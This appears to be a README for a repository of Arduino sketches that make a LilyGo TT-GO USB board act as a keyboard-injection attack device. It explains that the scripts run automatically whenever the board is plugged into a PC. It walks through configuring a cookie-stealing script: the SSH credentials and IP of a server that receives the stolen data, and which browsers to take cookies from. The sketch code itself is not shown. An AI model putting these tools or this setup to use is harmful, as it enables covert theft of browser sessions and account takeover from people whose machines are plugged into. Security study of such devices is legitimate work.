# LilyGo TT-GO USB Examples
## What's LilyGO
Lilygo TTGO boards can function as HID (Human Interface Device). TT-GO USB is a keyboard emulator that uses ATMEGA32U4. These boards are designed to emulate keyboard key presses and can be programmed to simulate keystrokes or perform various tasks as if a physical keyboard were being used.

With the Lilygo TTGO boards acting as HID or keyboard emulators, you can control other devices or interact with computer systems by sending keyboard commands programmatically. This functionality opens up possibilities for automation, remote control, and integration of electronic projects with computers or other devices.

While Lilygo boards with HID capabilities can be used for legitimate purposes, it's important to acknowledge that any technology can be misused in a malicious way. Those include, but are not limited to, stealing cookies or downloading files from external sources. Basically, any action that can be done, by only using keyboard can be performed.

## Goals
The goal of this repo is to present examples of malicious usage of HID acting as keyboards. Project is dedicated for cybersecurity enthusiasts that want to expand their knowledge in physical devices.

## Tech
To successfuly run this project you need:

- Arduino IDE which can be downloaded [HERE](https://support.arduino.cc/hc/en-us/articles/360019833020-Download-and-install-Arduino-IDE)
- Keyboard.h library for IDE. You can get it [HERE](https://reference.arduino.cc/reference/en/language/functions/usb/keyboard/)
- Physical device called "LilyGo TT-GO USB" which uses ATMEGA32U4. Or any other microprocessor that supports arduino keyboard library

## Installation
Installation is pretty straight forward:
1. Plug in your USB microcontroller
2. Run Arduino IDE
3. Open any .ino file from this project
4. Click on "Verify" and then "Upload"

This way you will upload script to your HID. Scripts are configured to run automatically, so each time you plug this device to a PC it will execute saved code.

## Configuration
Each script can be configured for ones needs. Configuration is at the top of the script. Let's have a look at _stealCookies.ino_ as an example:

_here you can assign username and password for SSH server connection as well as server IP and path to destination folder:_

const char* server_user = "ubuntu";
const char* server_password = "ubuntu";
const char* server_path = "/home/ubuntu";
const char* server_ip = "192.168.8.124";

_here you can enable from which browsers script will take an attemp to steal cookies_

bool chrome = 1;
bool firefox = 0;
bool edge = 1;

## License

MIT

